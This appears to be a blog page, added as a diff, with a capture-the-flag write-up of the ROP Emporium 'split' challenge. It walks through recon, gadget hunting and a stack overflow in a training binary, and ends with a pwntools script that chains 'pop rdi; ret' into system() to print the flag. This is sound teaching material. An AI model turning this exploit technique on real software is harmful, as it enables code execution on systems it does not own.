@@ -1,0 +1,223 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>ROP Emporium: split · river</title>
+    <meta name="description" content="Building a ROP chain to call system() with a custom string argument">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/ropemporium-split/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="ROP Emporium: split">
+    <meta property="og:description" content="Building a ROP chain to call system() with a custom string argument">
+    <meta property="og:url" content="https://rivers.sh/posts/ropemporium-split/">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">ROP Emporium: split</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2026-01-27">Jan 27, 2026</time><span>2 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/rop-emporium/">ROP Emporium</a></span><span class="post-tags"><a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a> <a class="p-category" href="/tags/rop/">#ROP</a> <a class="p-category" href="/tags/x86-64/">#x86-64</a> <a class="p-category" href="/tags/pwntools/">#pwntools</a> <a class="p-category" href="/tags/ropgadget/">#ROPgadget</a></span></div>
+        <p class="post-description p-summary">Building a ROP chain to call system() with a custom string argument</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#recon">Recon</a></li><li class="toc-h2"><a href="#gathering-intel">Gathering Intel</a></li><li class="toc-h2"><a href="#the-rop-strategy">The ROP Strategy</a></li><li class="toc-h2"><a href="#vulnerability">Vulnerability</a></li><li class="toc-h2"><a href="#building-the-rop-chain">Building the ROP Chain</a></li><li class="toc-h2"><a href="#exploitation">Exploitation</a></li><li class="toc-h2"><a href="#key-takeaways">Key Takeaways</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h2 id="challenge-info"><a href="#challenge-info" class="anchor">#</a>Challenge Info</h2>
+<p>Use ROP (Return-Oriented Programming) to call <code>system("/bin/cat flag.txt")</code> by chaining gadgets together.</p>
+<h2 id="recon"><a href="#recon" class="anchor">#</a>Recon</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> file split</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">split:</span> ELF 64-bit LSB executable, x86-64, version 1 <span class="er">(</span><span class="ex">SYSV</span><span class="kw">)</span><span class="ex">,</span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID<span class="pp">[</span><span class="ss">sha1</span><span class="pp">]</span>=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> checksec</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">File:</span>     split</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Arch:</span>     amd64</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">RELRO:</span>      Partial RELRO</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Stack:</span>      No canary found</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">NX:</span>         NX enabled</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">PIE:</span>        No PIE <span class="er">(</span><span class="ex">0x400000</span><span class="kw">)</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Stripped:</span>   No</span></code></pre></div>
+<p>Same protections as ret2win - no canary, no PIE, but NX is enabled so we need ROP instead of shellcode.</p>
+<h2 id="gathering-intel"><a href="#gathering-intel" class="anchor">#</a>Gathering Intel</h2>
+<p>First, let's see what useful strings exist:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> strings split <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;flag&quot;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/bin/cat</span> flag.txt</span></code></pre></div>
+<p>The command we need is in the binary. Now let's find available functions:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> info functions</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>0x0000000000400560  system<span class="fu">@</span><span class="er">p</span>lt</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>0x00000000004006e8  pwnme</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>0x0000000000400742  usefulFunction</span></code></pre></div>
+<p><code>system@plt</code> is available, and there's a <code>usefulFunction</code>:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> disass usefulFunction</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function usefulFunction<span class="op">:</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>   0x0000000000400742 &lt;+0&gt;:     <span class="bu">push</span>   <span class="kw">rbp</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>   0x0000000000400743 &lt;+1&gt;:     <span class="bu">mov</span>    <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>   0x0000000000400746 &lt;+4&gt;:     <span class="bu">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x40084a</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>   0x000000000040074b &lt;+9&gt;:     <span class="cf">call</span>   <span class="bn">0x400560</span> <span class="op">&lt;</span>system<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>   0x0000000000400750 &lt;+14&gt;:    <span class="bu">nop</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>   0x0000000000400751 &lt;+15&gt;:    <span class="bu">pop</span>    <span class="kw">rbp</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>   0x0000000000400752 &lt;+16&gt;:    <span class="cf">ret</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="pp">End</span> of assembler dump<span class="op">.</span></span></code></pre></div>
+<p>This calls <code>system()</code> but with the wrong argument:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> x<span class="op">/</span>s <span class="bn">0x40084a</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>0x40084a:       &quot;/bin<span class="op">/</span>ls<span class="st">&quot;</span></span></code></pre></div>
+<p>Not useful - we need <code>/bin/cat flag.txt</code>. Let's find its address:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> objdump <span class="at">-s</span> split <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;cat flag&quot;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">601060</span> 2f62696e 2f636174 20666c61 672e7478 /bin/cat flag.tx</span></code></pre></div>
+<p>String address: <code>0x601060</code></p>
+<h2 id="the-rop-strategy"><a href="#the-rop-strategy" class="anchor">#</a>The ROP Strategy</h2>
+<p>In x86-64, the first function argument goes in the <code>rdi</code> register. We need to:</p>
+<ol type="1">
+<li>Load <code>0x601060</code> (our string) into <code>rdi</code></li>
+<li>Call <code>system()</code></li>
+</ol>
+<p>We need a <code>pop rdi; ret</code> gadget:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ROPgadget <span class="at">--binary</span> split <span class="at">--only</span> <span class="st">&quot;pop|ret&quot;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Gadgets</span> information</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">============================================================</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x00000000004007c3</span> : pop rdi <span class="kw">;</span> <span class="ex">ret</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x000000000040053e</span> : ret</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
+<p><code>0x4007c3</code> - exactly what we need.</p>
+<h2 id="vulnerability"><a href="#vulnerability" class="anchor">#</a>Vulnerability</h2>
+<p>Same pattern as ret2win, <code>pwnme</code> allocates 32 bytes but reads 96 bytes (<code>0x60</code>):</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>   0x00000000004006ec &lt;+4&gt;:     <span class="bu">sub</span>    <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x20</span>      <span class="co">; 32 bytes allocated</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>   ...</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>   0x0000000000400723 &lt;+59&gt;:    <span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x60</span>      <span class="co">; reading 96 bytes!</span></span></code></pre></div>
+<p>Offset to return address: 40 bytes (32 buffer + 8 saved RBP)</p>
+<h2 id="building-the-rop-chain"><a href="#building-the-rop-chain" class="anchor">#</a>Building the ROP Chain</h2>
+<pre><code>Stack after overflow:
++------------------+
+| &#39;A&#39; * 40         |  &lt;- padding
++------------------+
+| pop rdi; ret     |  &lt;- gadget address
++------------------+
+| 0x601060         |  &lt;- gets popped into rdi
++------------------+
+| system@plt       |  &lt;- execute system(rdi)
++------------------+</code></pre>
+<p>Flow:</p>
+<ol type="1">
+<li><code>ret</code> pops <code>0x4007c3</code> into RIP</li>
+<li><code>pop rdi</code> pops <code>0x601060</code> into RDI</li>
+<li><code>ret</code> pops <code>0x40074b</code> into RIP</li>
+<li><code>system("/bin/cat flag.txt")</code> executes</li>
+</ol>
+<h2 id="exploitation"><a href="#exploitation" class="anchor">#</a>Exploitation</h2>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="co"># addresses</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>pop_rdi_ret <span class="op">=</span> p64(<span class="bn">0x4007c3</span>)</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>cat_flag <span class="op">=</span> p64(<span class="bn">0x601060</span>)</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>system_call <span class="op">=</span> p64(<span class="bn">0x40074b</span>)  <span class="co"># use call system in usefulFunction</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(<span class="st">&#39;./split&#39;</span>)</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;A&#39;</span> <span class="op">*</span> <span class="dv">40</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> pop_rdi_ret</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> cat_flag</span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> system_call</span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>p.send(payload)</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<p>Note: We use <code>0x40074b</code> (the <code>call system</code> inside <code>usefulFunction</code>) rather than <code>system@plt</code> directly to avoid stack alignment issues that can occur with modern libc.</p>
+<h2 id="key-takeaways"><a href="#key-takeaways" class="anchor">#</a>Key Takeaways</h2>
+<ul>
+<li><strong>ROP chains</strong> let us execute arbitrary code even with NX enabled</li>
+<li><strong>x64 calling convention</strong>: first arg in <code>rdi</code>, second in <code>rsi</code>, etc.</li>
+<li><strong>Gadget hunting</strong>: tools like ROPgadget find useful instruction sequences</li>
+<li><strong>Stack alignment</strong>: sometimes you need to be careful about 16-byte alignment when calling libc functions</li>
+</ul>
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/ropemporium-ret2win/" rel="prev"><span class="post-nav-label">‹ older</span>ROP Emporium: ret2win</a>
+        <a class="next" href="/posts/ropemporium-callme/" rel="next"><span class="post-nav-label">newer ›</span>ROP Emporium: callme</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/ropemporium-ret2win/" title="older: ROP Emporium: ret2win" aria-label="older post">‹</a></li>
+        <li><a href="/posts/ropemporium-callme/" title="newer: ROP Emporium: callme" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#recon">Recon</a></li><li class="toc-h2"><a href="#gathering-intel">Gathering Intel</a></li><li class="toc-h2"><a href="#the-rop-strategy">The ROP Strategy</a></li><li class="toc-h2"><a href="#vulnerability">Vulnerability</a></li><li class="toc-h2"><a href="#building-the-rop-chain">Building the ROP Chain</a></li><li class="toc-h2"><a href="#exploitation">Exploitation</a></li><li class="toc-h2"><a href="#key-takeaways">Key Takeaways</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="bG92ZS5yaXZlcnNAcHJvdG9uLm1l">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
